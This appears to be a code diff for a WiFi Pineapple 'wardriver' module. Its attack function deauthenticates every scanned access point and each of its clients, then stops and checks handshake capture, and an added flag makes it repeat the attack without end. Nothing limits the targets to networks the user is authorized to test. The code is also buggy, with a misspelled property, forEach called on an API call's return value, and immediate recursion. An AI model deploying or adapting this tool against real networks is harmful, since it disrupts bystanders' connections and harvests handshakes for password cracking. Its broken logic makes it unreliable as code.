@@ -1,9 +1,7 @@
-import { Component, OnInit, NgModule } from '@angular/core'; 
+import { Component, OnInit } from '@angular/core'; 
 import { ApiService } from '../services/api.service'; 
-import { StatusRootObject, Header, Message } from '../interfaces/status.interface';
+import { StatusRootObject} from '../interfaces/status.interface';
 import { APResult } from '../interfaces/reconresult.interface';
-import { exit } from 'process';
-import { throws } from 'assert';
 
 @Component({ 
     selector: 'lib-wardriver', 
@@ -18,6 +16,7 @@ export class WarDriverComponent implements OnInit {
     statusFileName: string = '';
     json_frontend: StatusRootObject;
     scanResultsArray: Array<APResult>;
+    continousDeauth: boolean = false;
 
     populateTargetBSSIDs(): void {
         this.API.APIGet('/api/pineap/ssids', (resp) => {
@@ -55,33 +54,45 @@ export class WarDriverComponent implements OnInit {
     attackd(): void {
         this.API.APIGet('/api/pineap/handshakes', (resp) => {  // start handshake capture
             if (resp.handshakes != null) {
-                this.scanResultsArray.forEach(ap => {
+                this.scanResultsArray.forEach(ap => { // loop through APs
                     let ap_deauth_payload = { // build ap deauth payload
                         bssid: ap.bssid,
                         multiplier: 1,
                         channel: 11,
-                        clients: []
+                        clients: [] // ??  "clients": string[] | https://hak5.github.io/mk7-docs/docs/rest/pineap/pineap/
                     }
                     this.API.APIPost('/api/pineap/deauth/ap', ap_deauth_payload, (resp) => {  // deauth the ap
                         console.log('>ap deauthd: ' +ap.bssid)
-                    }).forEach(client => {
-                        let client_deauth_payload = {
+                    }).forEach(client => { // loop through clients
+                        let client_deauth_payload = { // build client deauth payload
                             bssid: ap.bssid,
                             mac: client.client_mac,
                             multiplier: 1,
                             channel: 11
                         }
-                        this.API.APIPost('/api/pineap/deauth/client', client_deauth_payload, (resp) => {
-
+                        this.API.APIPost('/api/pineap/deauth/client', client_deauth_payload, (resp) => { // deauth a client
+                            console.log('>deauthd: ' +client.client_mac);
                         });
                     });
                 });
             }
         });
-                        // deauth bssid
-                        // loop through clients, deauth each
-                        // stop handshakes
-                        // check for handshakes               
+        console.log('>cooling down breifly, waiting for straggling handshakes');
+        setTimeout(() => {
+            this.API.APIPost('/api/pineap/handshakes/stop', null, (resp) => { // stop handshake capture
+                console.log('>stopped handshake capture');
+                this.API.APIGet('/api/pineap/handshakes', (resp) => {
+                    if (resp.handshakes.lengh > 0) {
+                        console.log('>handshakes found!');
+                    }
+                    else { console.log('>no handshakes found :('); }
+                    }
+                )
+            });
+        }, 20000);    
+        if (this.continousDeauth) {
+            this.attackd();
+        }
     }
     
     run_scand(): void {
@@ -143,7 +154,7 @@ export class WarDriverComponent implements OnInit {
 }
 
     ngOnInit() { 
-        this.populateTargetBSSIDs();
+        //this.populateTargetBSSIDs();
         //this.get_status();
         this.run_scand();
     } 
